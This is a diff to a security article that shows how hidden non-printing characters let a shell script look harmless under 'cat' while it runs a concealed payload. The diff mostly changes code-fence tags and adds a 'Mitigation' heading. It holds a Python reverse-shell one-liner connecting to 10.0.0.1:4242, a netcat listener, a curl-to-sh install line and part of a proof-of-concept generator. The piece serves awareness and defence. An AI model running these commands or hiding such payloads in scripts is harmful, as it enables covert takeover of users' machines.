@@ -2,8 +2,8 @@
 
 Downloading and executing scripts such as
 
-```
-$ sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)
+```bash
+$ sh -c '$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)'
 ```
 
 It is recommended to always check what is inside of the script.
@@ -16,19 +16,19 @@ How many times have you run the script, checking it superficially with a “cat�
 
 ### _Impostor:_
 
-```
+```bash
 echo -n Hello there! This is todays date: $(date)
 ```
 
 ### _Payload:_
 
-```
+```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
 ```
 
 ### _Generator:_
 
-```
+```python
 #!/usr/bin/python 
 import sys  
 
@@ -67,7 +67,7 @@ if __name__ == "__main__":
 
 Now as we generate our script with hidden characters, let’s check what is inside using “cat” command.
 
-```
+```bash
 $ cat ./poc.sh
 
 echo -n Hello there! This is todays date: $(date)
@@ -75,7 +75,7 @@ echo -n Hello there! This is todays date: $(date)
 
 Seems like nothing special. Let’s start the listener and run the script.
 
-```
+```bash
 nc -lvnp 9999 & chmod 755 poc.sh && ./poc.sh
 ```
 
@@ -83,8 +83,10 @@ nc -lvnp 9999 & chmod 755 poc.sh && ./poc.sh
 
 ### _**We just executed arbitrary, hidden code, resulting in a compromise of the machine.**_
 
+## Mitigation
+
 To prevent this, use: 
-```
+```bash
 - Command cat with -v parameter displays non-printing characters 
 - Command more will reveal non printing characters in Windows environment 
 - In Powershell use commandlet Write-Output
